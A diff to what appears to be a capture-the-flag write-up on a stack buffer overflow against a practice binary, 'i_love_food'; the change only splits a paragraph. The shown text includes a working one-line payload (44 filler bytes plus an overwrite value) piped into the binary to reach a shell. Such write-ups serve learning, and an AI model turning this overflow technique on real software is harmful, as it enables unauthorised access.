@@ -141,7 +141,9 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000000000000000 in ?? ()
 ```
 
-We can see in the stack that the variable has been modified, and by resuming execution after the breakpoint the program does reach the success message and open another process. Let's test our payload on the binary using the intruction `(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee)` to input our payload, and then freeze the shell before it closes :
+We can see in the stack that the variable has been modified, and by resuming execution after the breakpoint the program does reach the success message and open another process.  
+  
+Let's test our payload on the binary using the intruction `(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee)` to input our payload, and then freeze the shell before it closes :
 
 ```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee) | ./i_love_food  
